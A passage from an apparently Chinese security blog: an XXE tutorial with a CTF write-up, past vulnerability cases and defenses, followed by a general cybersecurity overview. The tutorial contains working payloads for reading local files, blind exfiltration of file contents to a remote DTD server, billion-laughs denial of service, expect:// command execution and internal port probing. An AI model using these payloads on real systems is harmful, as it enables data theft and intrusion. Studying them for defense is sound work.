&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;
]&gt;
&lt;author&gt;&amp;file;©right;&lt;/author&gt;
</code></pre>
<p><strong>XXE的攻击与危害</strong><br>
　　当我们了解清楚以上的信息后，我们就能理解如何构造外部实体注入攻击与它的危害性了。</p>
<p>如何构造外部实体注入攻击<br>
　　一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据。</p>
<p>有回显的payload写法：</p>
<p>直接通过DTD外部实体声明。XML内容如下：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;
]&gt;
&lt;abc&gt;&amp;test;&lt;/abc&gt;
</code></pre>
<p>通过DTD文档引入外部DTD文档，再引入外部实体声明。XML内容如下：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a SYSTEM &quot;http://localhost/evil.dtd&quot;&gt;
&lt;abc&gt;&amp;b;&lt;/abc&gt;
</code></pre>
<p>evil.dtd内容：</p>
<pre><code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
</code></pre>
<p>通过DTD外部实体声明引入外部实体声明。XML内容如下:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a [
&lt;!ENTITY % d SYSTEM &quot;http://localhost/evil.dtd&quot;&gt;
%d;
]&gt;
&lt;abc&gt;&amp;b;&lt;/abc&gt;
</code></pre>
<p>evil.dtd内容：</p>
<pre><code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
</code></pre>
<p>但是如果想通过如下声明是不可以的：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt; 
&lt;!DOCTYPE a [
&lt;!ENTITY d SYSTEM &quot;http://localhost/evil.xml&quot;&gt;
]&gt;
&lt;abc&gt;&amp;d;&lt;/abc&gt;
</code></pre>
<p>测试发现这种实体调用外部实体，发现evil.xml中不能定义实体，否则解析不了，参数实体就好用很多。</p>
<p>无回显的payload写法：</p>
<p><strong>第一种无回显示payload写法：</strong></p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt; 
&lt;!DOCTYPE a [
&lt;!ENTITY % file SYSTEM &quot;file:///c://test/1.txt&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt; 
%dtd; %all; 
]&gt; 
&lt;abc&gt;&amp;send;&lt;/abc&gt;
</code></pre>
<p>其中evil.xml文件内容为</p>
<pre><code>&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM 'http://localhost%file;'&gt;&quot;&gt;
</code></pre>
<p>调用过程为：参数实体dtd调用外部实体evil.xml，然后又调用参数实体all，接着调用实体send。</p>
<p><strong>第二种无回显payload写法：</strong></p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a [
&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=c:/test/1.txt&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt;
%dtd;
%send;
]&gt;
&lt;abc&gt;&lt;/abc&gt;
其中evil.xml文件内容为：

&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM 'http://localhost/?content=%file;'&gt;&quot;&gt; %payload;
</code></pre>
<p>调用过程和第一种方法类似，但最里层的嵌套里%要进行实体编码成%。无报错需要访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。</p>
<p>这里注意参数实体引用%file;必须放在外部文件里，因为根据这条 规则 。在内部DTD里，参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则解析器会报错： PEReferences forbidden in internal subset。这里的        internal subset指的是中括号[]内部的一系列元素声明，PEReferences 指的应该是参数实体引用 Parameter-Entity Reference 。</p>
<p>一般都使用第二种方法，因为当文件中含有中文字符或&lt;字符，会导致不能解析。</p>
<p><strong>XXE带来的危害</strong><br>
　　利用xxe漏洞可以进行文件读取，拒绝服务攻击，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等。内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用xxe进行SSRF的利用，基本上啥都能做。</p>
<p>首先准备一个有XXE漏洞的文件，本次测试以php为主：</p>
<pre><code>&lt;?php
$xml = simplexml_load_string($_REQUEST['xml']);
echo &quot;&lt;pre&gt;&quot; ;
print_r($xml);//注释掉该语句即为无回显的情况
?&gt;
</code></pre>
<p><strong>危害1.读取任意文件</strong></p>
<p>有回显情况:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
&lt;!ENTITY test SYSTEM &quot;file:///E://phpStudy/PHPTutorial/WWW/etc/passwd.txt&quot;&gt;
]&gt;
&lt;abc&gt;&amp;test;&lt;/abc&gt;
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1626702413435.png" alt="" loading="lazy"><br>
无回显情况:</p>
<p>本次测试用的phpStudy，需开启apache日志记录并重启服务。当无回显情况时，可以讲数据发送到远程服务器。</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a [
&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=E://phpStudy/PHPTutorial/WWW/etc/passwd.txt&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt;
%dtd;
%send;
]&gt;
&lt;abc&gt;&lt;/abc&gt;
</code></pre>
<p>远程服务器部署evil.xml内容为:</p>
<pre><code>&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM 'http://localhost/?content=%file;'&gt;&quot;&gt; %payload;
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1626702211666.png" alt="" loading="lazy"><br>
YWRtaW46OnBhc3N3b3JkIQ0KdGVzdDo6cGFzc3dkIQ==Base64解码即可。</p>
<p>通过此方法可以读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件、获取帐号密码后进一步攻击。如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。</p>
<p><strong>危害2.拒绝服务攻击</strong></p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE lolz [
&lt;!ENTITY lol &quot;lol&quot;&gt;
&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;
]&gt;
&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
</code></pre>
<p>此示例就是著名的Billion laughs attack该攻击是通过创建一项递归的 XML 定义，在内存中生成十亿个&quot;Ha！&quot;字符串，从而导致 DoS 攻击。</p>
<p>原理：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。</p>
<p><strong>危害3.远程命令(代码)执行</strong></p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
&lt;!ENTITY test SYSTEM &quot;expect://id&quot;&gt;
]&gt;
&lt;abc&gt;&amp;test;&lt;/abc&gt;
</code></pre>
<p>此示例是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能有此漏洞。</p>
<p><strong>危害4.内网信息探测</strong></p>
<p>利用http协议http://url/file.ext，替换标准poc中相应部分即可,这种情况比较不稳定，根据不同xml解析器会得到不同的回显报错结果。</p>
<p>有回显情况：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
&lt;!ENTITY test SYSTEM &quot;http://127.0.0.1:87/tets.txt&quot;&gt;
]&gt;
&lt;abc&gt;&amp;test;&lt;/abc&gt;
</code></pre>
<p>当端口开放时，如80端口：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626702632954.png" alt="" loading="lazy">)<br>
当端口未开放时，如81端口:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626702272399.png" alt="" loading="lazy"><br>
无回显情况：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a [
&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=http://127.0.0.1:81/&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt;
%dtd;
%send;
]&gt;
&lt;abc&gt;&lt;/abc&gt;
</code></pre>
<p>远程服务器部署evil.xml内容为:</p>
<pre><code>&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM 'http://localhost/?content=%file;'&gt;&quot;&gt; %payload;
</code></pre>
<p>观察日志文件即可。</p>
<p>当端口开放时，如80端口:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626702609532.png" alt="" loading="lazy"><br>
当端口未开放时，如81端口:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626702614433.png" alt="" loading="lazy"><br>
有的无回显的情况还可以通过抓包看响应头返回的状态码，返回的报错信息等判断。</p>
<p><strong>危害5.攻击内网网站</strong></p>
<p>难得搭建环境，就直接引用网上的例子吧：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626702620816.png" alt="" loading="lazy"><br>
这个示例是攻击内网strusts2网站，远程执行系统命令。</p>
<p>还可部署bash文件建立监听，获得反弹shellcode等。</p>
<p>由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。</p>
<p>CTF题目</p>
<p><strong>JarvisOJ——api调用</strong><br>
请设法获得目标机器/home/ctf/flag.txt中的flag值。</p>
<p>题目入口：http://web.jarvisoj.com:9882/</p>
<p>先查看源码：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626702685525.png" alt="" loading="lazy"><br>
再看响应<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626702690221.png" alt="" loading="lazy"><br>
开始以为是考反序列化，但根据提示和结果发现不是。这个页面仅仅是向后台发送请求，后台再响应返回几个特定的字符串，修改请求值，发现返回与前台的输入没多大关系。最后，知道是XXE。</p>
<p>这道题目，默认的是json格式传递，因此首先我们更改Content-Type的值为application/xml，然后传入xml代码：</p>
<pre><code>&lt;?xml version=”1.0″?&gt;
&lt;!DOCTYPE a[
&lt;!ENTITY xxe SYSTEM &quot;file:///home/ctf/flag.txt&quot;&gt;]&gt;
&lt;abc&gt;&amp;xxe;&lt;/abc&gt;
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1626702695371.png" alt="" loading="lazy"><br>
DDCTF——喝杯Java冷静下<br>
http://116.85.48.104:5036/gd5Jq3XoKvGKqu5tIH2p/</p>
<p>提示：第二层关卡应用版本号为2.3.1</p>
<p>此题目有点难，由于技术不到位，有的地方不是很清楚就不误导读者了。</p>
<p>直接看看大佬的姿势吧：</p>
<p>DDCTF2018 WEB6 喝杯Java冷静下 WRITEUP —— LZ1Y</p>
<p>DDCTF 2018 Web Writeup —— 白帽100安全攻防实验室</p>
<p>真实案例<br>
微信支付XXE漏洞 再提一次刚爆出的微信XXE漏洞，还可以欣赏一篇对此漏洞的修复文章。</p>
<p>在线文件预览引起的问题，修改docx文件的word/document.xml，添加DTD和实体引用，即可触发，可据此生成恶意的Word文档。</p>
<pre><code>[WooYun-2014-73321（网易邮箱某处XXE可读取文件）](http://www.anquan.us/static/bugs/wooyun-2014-073321.html)

[WooYun-2014-73439（QQ邮箱XXE可读取任意文件）](http://www.anquan.us/static/bugs/wooyun-2014-073439.html)
直接处理POST XML数据。许多都是直接 simplexml_load_string() 处理POST进来的数据。可控字符串出现在XML文件里就要引起注意。

[WooYun-2015-109725（中通某处XXE漏洞可读取服务器任意文件）](http://www.anquan.us/static/bugs/wooyun-2015-0109725.html)
</code></pre>
<p>XML处理工具</p>
<p>WooYun-2014-59911（从开源中国的某XXE漏洞到主站shell）格式化XML。</p>
<p>WooYun-2015-134057（百度某平台Blind XXE漏洞&amp;可Bool型SSRF攻击）XML检查工具。</p>
<p>WooYun-2015-135397（搜狗某平台Blind XXE漏洞(读取文件/SSRF/Struts2命令执行) XML检查工具。<br>
WooYun-2014-58381（百度某功能XML实体注入）该功能点提供svg转jpg服务，通过构造特殊svg文件注入。</p>
<p>WooYun-2014-59783（百度某功能XML实体注入（二））在第一次修复后只过滤了ENTITY这个词，DTD 本身就支持调用外部的DTD文件，因此我们只需要在svg里加一个外部的DTD就绕过了。</p>
<p>WooYun-2014-74069（鲜果网RSS导入Blind XXE漏洞 ）导入OPML文件。</p>
<p>WooYun-2015-111828（博客园某处XXE可下载任意文件）博客搬家功能，导入XML。</p>
<p>WooYun-2015-117316（用友人力资源管理软件全版本XXE漏洞 ）登陆与重置密码时使用XML传输数据。</p>
<p>WooYun-2015-148793（AOL Website XML External Entity(XXE) Vulnerability）xmlrpc service。</p>
<p>WooYun-2015-156208（国际php框架slim架构上存在XXE漏洞（XXE的典型存在形式））服务端根据请求的 content-type 来区别对待提交的数据。application/x-www-form-urlencoded 、application/json 、application/xml 被用不同的方式解析。XML直接调用 simplexml_load_string 处理导致漏洞。有趣的是旧版本对该问题做了防范，新版本去除了相关代码，可能是觉得新版本对PHP版本需求在5.5以上。实际上PHP是否解析外部实体与本身版本无关，与编译时libxml库版本有关。</p>
<p>WooYun-2016-168457（唯品会存在Blind XXE 漏洞）。作者说 关于XXE，觉得漏洞本身没太多的玩点，比较有意思主要在于：不同语言处理URI的多元化和不同XML解析器在解析XML的一些特性。 xfire是流行的webservice开发组件，其在invoke时使用了STAX解析XML导致XML实体注入发生 。乌云上一大波XXE洞都是这个，详细说明见 WooYun-2016-166751(Xfire文件读取漏洞)。</p>
<p>WooYun-2014-59911（从开源中国的某XXE漏洞到主站shell）XXE读取到脚本文件/home/run/ssh_go.sh，内含SSH登陆密码。</p>
<p>Revisting XXE and abusing protocols 【XXE+expect模块=&gt;Facbook RCE】</p>
<p>XXE on Windows system …then what ?? 【XXE+SMB=&gt;内网RCE】</p>
<p>Apache Solr XXE漏洞分析 【CVE-2018-8026】<br>
XXE自动化工具<br>
　　XXEinjector：一款功能强大的自动化XXE注射工具。</p>
<p>本文就不具体演示、讲述此工具了。推荐一篇文章，详细的讲述了其使用方法，最后还附了XXEinjector工具的下载。</p>
<p>寻找XXE<br>
检测xml是否被解析</p>
<p>尝试注入特殊字符，使XML失效，引发解析异常，明确后端使用XML传输数据。</p>
<p>单双引号 ' &quot; ：XML的属性值必须用引号包裹，而数据可能进入标签的属性值。<br>
尖括号&lt; &gt; ：XML的开始/结束标签用尖括号包裹，数据中出现尖括号会引发异常。<br>
注释符&lt;!-- ：XML使用<!-- This is a comment -->作注释。<br>
&amp; ：&amp; 用于引用实体。<br>
<code>CDATA 分隔符]]&gt; ：&lt;![CDATA[foo]]&gt;</code>中的内容不被解析器解析，提前闭合引发异常。<br>
检测是否支持外部实体解析</p>
<p>尝试利用实体和DTD。</p>
<pre><code>引用外部DTD文件访问内网主机/端口 ：&lt;!DOCTYPE a SYSTEM &quot;http://127.0.0.1:2333&quot;&gt;（看响应时间）
引用外部DTD文件访问外网 ：&lt;!DOCTYPE a SYSTEM &quot;http://vps_ip&quot; &gt;
引用内部实体 ：&lt;!DOCTYPE a [&lt;!ENTITY xxe &quot;findneo&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;
外部实体读本地文件 ：&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/hosts&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;
外部实体访问内网主机/端口 ：&lt;!DOCTYPE a SYSTEM &quot;http://192.168.1.2:80&quot;&gt;（看响应时间）
外部实体访问外网 ：&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM &quot;http://vps_ip&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;
</code></pre>
<p>判断问题存在可以OOB提取数据。<br>
XXE的防御<br>
使用开发语言提供的禁用外部实体的方法<br>
　　PHP</p>
<p>libxml_disable_entity_loader(true);</p>
<p>JAVA</p>
<p>DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</p>
<p>dbf.setExpandEntityReferences(false);</p>
<p>Python</p>
<p>from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p>
<p>过滤用户提交的XML数据<br>
　　过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。</p>
<p>参考资料<br>
http://www.freebuf.com/column/156863.html<br>
https://security.tencent.com/index.php/blog/msg/69<br>
https://xz.aliyun.com/t/2571#toc-10<br>
http://www.w3school.com.cn/dtd/<br>
大家有任何问题可以提问，更多文章可到i春秋论坛阅读哟~<br>
来自FreeBuf.COM</p>
<h1 id="2021-07-20">2021-07-20</h1>
<p>#nmap的使用方法<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736650861.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736653159.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736655496.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736657736.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736660130.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736662968.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736665551.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736668085.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736670425.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736673446.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736677060.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736679820.png" alt="" loading="lazy"></p>
<p>#什么是网络安全？<br>
就像物理安全旨在保护人身财产和人员免受犯罪活动或意外损坏一样，网络安全保护计算机系统、后端系统和最终用户应用程序、这些系统的用户以及他们存储的数据。</p>
<p>网络安全旨在防止网络罪犯、恶意内部人员或其他人员访问、伤害、破坏或修改 IT 系统和应用程序。</p>
<p>网络安全的重要性<br>
随着人类社会数字化，我们生活的方方面面都得益于网络、计算机和其他电子设备以及软件应用。包括医疗保健、金融机构、政府和制造业在内的关键基础设施都使用计算机或智能设备作为其运营的核心部分。这些设备绝大多数连接到互联网。</p>
<p>威胁行为者比以往更有动力去寻找渗透这些计算机系统的方法，以谋取经济利益、敲诈勒索、政治或社会动机（称为黑客主义），或者仅仅是故意破坏。</p>
<p>在过去二十年中，针对所有发达国家的关键基础设施发动了网络攻击，无数企业遭受了灾难性的损失。全球每年有超过 2，000 起已确认的数据泄露事件，每次泄露平均花费超过 390 万美元（美国为 810 万美元）。自2000年以来，超过35亿人（占世界人口的一半）的私人信息被网络罪犯窃取。</p>
<p>安全漏洞和威胁几乎会影响任何系统，包括：<br>
通信——电话、电子邮件、短信和消息应用程序都可以用于网络攻击<br>
金融——当然，金融机构是攻击者的主要目标，任何处理银行或信用卡信息的组织都处于危险之中<br>
政府——政府机构通常成为网络罪犯的目标，他们可能追求公民个人信息或机密公共数据<br>
交通——互联汽车、交通控制系统和智能道路基础设施都面临网络威胁的风险<br>
医疗保健——从当地诊所的医疗记录到国家医院的重症监护系统，任何疾病都容易受到攻击<br>
教育机构、其机密的研究数据以及他们掌握的关于学生或教职员工的信息都面临受到攻击的风险<br>
在这些系统中，绝大多数网站和 Web 应用程序都是攻击者的网关。它们暴露在公共互联网上，通常连接到敏感的后端系统，是该组织安全战略中的一个薄弱环节</p>
<p>无论您的组织是任何规模的企业、接收大量流量的网站，还是为公共利益服务的机构或非营利组织，准备和抵御网络安全威胁都应该是您最关心的问题之一。</p>
<p><strong>网络安全原则</strong><br>
网络安全的主要目标是保护数据。安全界通常指确保数据安全的三角形，称为 CIA 三合会：</p>
<p>保密性——确保敏感数据仅对实际需要的人访问，并允许根据组织政策访问，同时阻止访问他人。<br>
完整性-确保数据和系统不会因为威胁行为者的行为或意外修改而进行修改。应采取措施防止腐败或丢失敏感数据，并在发生此类事件时迅速恢复。<br>
可用性-确保数据仍然可用，对其最终用户有用，并确保此访问不会因系统故障、网络攻击甚至安全措施本身而受阻。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626740013759.png" alt="" loading="lazy"><br>
中情局三合会定义了数据安全的三项关键原则</p>
<p>为了实现中情局的目标，组织必须保护两个方面或其 IT 环境：应用安全和数据安全。</p>
<p><strong>通用应用安全策略</strong><br>
应用程序安全性可确保面向用户的应用程序免受外部威胁、对托管或使用应用程序（端点）的设备的攻击以及内部威胁的渗透或破坏。以下是三种最常见的应用安全策略。</p>
<p><strong>DDoS保护</strong></p>
<p>分布式拒绝服务 （DDoS） 攻击使用攻击者控制的大量连接设备，用虚假流量淹没网站的资源。由于当今 DDoS 攻击的规模很大，因此常见的保护措施是基于云的 DDoS 缓解服务。这些服务使用 DNS 或 BGP 路由将流量转移到基于云的擦洗服务器、删除恶意请求并将合法请求转发到 Web 服务器。</p>
<p><strong>Web 应用程序防火墙</strong></p>
<p>网络应用防火墙 （WAF） 部署在网络边缘作为反向代理，检查网络应用程序的传入和出站 HTTP/S 流量，并过滤掉恶意流量。WAF 使用安全策略和威胁情报数据（如已知的不良流量源和已知的攻击模式）来确定哪些流量不应到达应用程序。</p>
<p><strong>高级机器人保护</strong></p>
<p>机器人是通过互联网执行操作的自动化程序。有些机器人是合法的，应该允许访问网站，而其他机器人是恶意的，可用于发起自动攻击。机器人管理是一个快速发展的领域，它使用机器人声誉数据库保护组织免受不良机器人的伤害，挑战测试机器人是否是真正的用户，以及识别可疑机器人行为的行为分析。</p>
<p><strong>通用数据安全策略</strong><br>
数据安全可确保外部方或未经授权的内部方无法访问数据，识别敏感数据的风险并解决这些风险，并设置检测方法以识别威胁行为者何时访问、修改或删除数据。以下是数据安全的三种常见策略。</p>
<p><strong>数据屏蔽</strong></p>
<p>许多数据泄露不是发生在生产环境中，而是发生在测试或 DevOps 环境中。这些环境通常不安全，但通常加载实时、敏感的客户数据。数据屏蔽使在测试服务器上使用逼真的数据成为可能，同时使用转换技术隐藏或争夺原始数据。</p>
<p><strong>漏洞发现</strong></p>
<p>许多软件系统都存在漏洞，黑客可能会利用这些漏洞来破坏系统。漏洞发现是一个依赖于漏洞数据库的过程，其中包含有关已知漏洞的详细信息。它允许组织检测哪些系统受到漏洞的影响，了解严重性和影响，并修复漏洞。</p>
<p><strong>端点安全</strong></p>
<p>组织中的端点设备数量正在爆炸式增长。有数百万台笔记本电脑、移动设备和物联网 （IoT 设备） 连接到互联网，并代表着日益严重的安全风险。</p>
<p>端点安全包括在每个端点部署代理，该代理可以提供下一代防病毒 （NGAV） 等安全功能，以检测零日攻击和内部威胁，以及端点检测和响应 （EDR），以帮助安全团队实时调查和阻止端点上的攻击。</p>
<p><strong>常见的网络威胁</strong><br>
网络安全形势复杂，数百万已知的威胁参与者和有案可查的战术、技术和程序 （TTP） 以及每天都在出现新型攻击。以下是您可能遭受的一些更常见的网络威胁：</p>
<p>威胁	        工作原理	对您的组织的风险<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626740233802.png" alt="" loading="lazy"><br>
<strong>构建网络安全战略</strong><br>
解决组织中的网络安全问题始于战略，该战略应得到高级管理层的支持，并与整个组织共享。</p>
<p>下面是一个可用于构建安全策略的过程：</p>
<p>1.执行计算资产清单-确定您的组织拥有哪些应用程序和数据，以及如果它们受到攻击或破坏的后果。创建需要保护的资产列表。<br>
2.确定合规性要求——您的组织是否遵守任何影响网络安全的法规或行业标准？识别与网络安全相关的合规要求，并将它们添加到受保护资产列表中。<br>
3.识别威胁和风险-审查影响您行业的威胁的全面列表，确定其中哪一个对您的组织最相关，并审查关键系统，以了解它们对攻击的脆弱程度。例如，运营网站的组织应关注网络应用程序威胁（如代码注入和恶意机器人），并对其 Web 应用程序进行评估，以了解其易受攻击性。<br>
4.优先考虑风险——鉴于您需要保护的系统、合规责任和常见威胁，请确定您面临的最大风险。哪些系统对企业最有价值，最有可能受到攻击？这是您应该针对您的网络安全计划的第一个风险。<br>
5.确定您的安全成熟度水平和现有模子——您的公司有网络安全计划吗？是否有内部工作人员或现有供应商提供安全服务？此外，还绘制出已经存在的网络安全措施。考虑保护物理设施（保安、服务器室锁着的门）、防火墙和防病毒等安全系统，以及组织使用的应用程序和服务（包括云服务）的安全措施。<br>
6.建立一个网络安全团队——利用组织中的现有员工，提高网络安全技能，雇佣新员工，并在必要时聘请顾问。创建一个有能力的团队，能够执行网络安全计划，以改善您的安全态势。<br>
7.为改善网络安全制定时间表和里程碑——您可以立即执行哪些快速胜利来改进对关键系统的保护？哪些长期措施需要更多时间，但对改善网络安全非常重要？制定至少 1-2 年的长期计划，每个季度都有明确的里程碑，表明安全团队应该实现什么目标。</p>
<p>7 网络安全趋势<br>
以下是网络安全社区中的重要趋势，您应该意识到这些趋势，因为您正在制定战略并选择您的工具集。</p>
<p><strong>1.网络安全和机器学习</strong><br>
过去，网络安全系统依靠手动定义的规则和人工检查来识别和分类安全事件。这是有效的，但有限，因为它需要高水平的专业知识来管理安全工具，并超载的安保人员。</p>
<p>许多现代安全工具使用机器技术实现安全决策自动化，而无需事先定义规则。这可以为安全团队节省大量时间，并导致对威胁做出更快、更准确的响应。</p>
<p>在网络安全中使用机器学习的几个例子是：</p>
<p>下一代防病毒 （NGAV）工具使用自动恶意软件分类，即使恶意软件与任何已知的二进制模式不匹配，也要识别恶意软件<br>
数据丢失预防 （DLP）系统使用机器学习读取文档或其他材料，并自动对其灵敏度进行分类<br>
电子邮件保护系统使用大量网络钓鱼与合法电子邮件的数据集进行培训，并且可以识别&quot;看起来像&quot;他们可能正在进行网络钓鱼尝试的电子邮件</p>
<p><strong>2.API 安全</strong><br>
应用程序编程接口 （API） 允许计算系统相互通信和共享数据。整个 API 经济已经出现，允许组织相互共享数据和软件功能。</p>
<p>虽然 API 为组织提供了很大的价值，但它们也代表着安全风险。对 API 安全重要性的认识有限，许多 API 端点缺乏基本的安全措施。攻击者可以操纵它们滥用 API 背后的服务，也可以成为组织关键系统的切入点。</p>
<p>在过去几年中，专门的 API 安全解决方案不断涌现，帮助组织锁定 API 端点、保护它们免受恶意流量的侵害，并抵御 DDoS 攻击。OpenAPI计划可帮助组织以标准化的方式定义其 API，从而能够执行建立在 API 功能基础上的安全政策。</p>
<p><strong>3.高级机器人保护</strong><br>
机器人是访问网站并执行自动操作的系统。例如，一些机器人是合法的，谷歌机器人爬行网站，以便将其添加到谷歌的搜索索引中。但其他机器人是恶意的，被威胁行为者用来对数百万个易受攻击的网站发起攻击。</p>
<p>机器人占当今网络流量的 58%，而整个22% 的 Web 流量归因于不良机器人。坏机器人可以安装在被攻击者破坏的最终用户设备上，形成巨大的僵尸网络。这些设备可能是家用电脑、服务器和物机设备，如游戏机或智能电视。 攻击者利用受损设备网络发动DDoS和许多其他类型的攻击。</p>
<p>机器人管理系统帮助组织识别不需要的机器人流量并将其过滤掉，同时允许合法的机器人流量和用户流量继续不间断。为此，他们需要使用各种方法（如：</p>
<p>声誉管理——管理已知的好坏机器人数据库<br>
设备指纹-识别操作系统或浏览器的属性，可能表示一个坏的机器人<br>
挑战——使机器人面临&quot;挑战&quot;，如动态页面元素或 CAPTCHA，人类用户能够处理这些内容，而机器人则无法处理这些挑战。</p>
<p><strong>4.文件安全</strong><br>
文件安全对于确保未经授权的各方（无论是内部还是外部）没有访问或篡改敏感数据至关重要。许多合规性标准要求组织对敏感数据文件实施严格控制，证明这些控制已经到位，并在发生违规时显示文件活动的审计跟踪。</p>
<p>文件安全技术可以自动识别可疑文件活动，这可能表示对数据渗透、勒索软件攻击的尝试，甚至是粗心大意的用户错误地删除文件或将其复制到不安全的位置。</p>
<p><strong>5.运行时应用程序自我保护</strong><br>
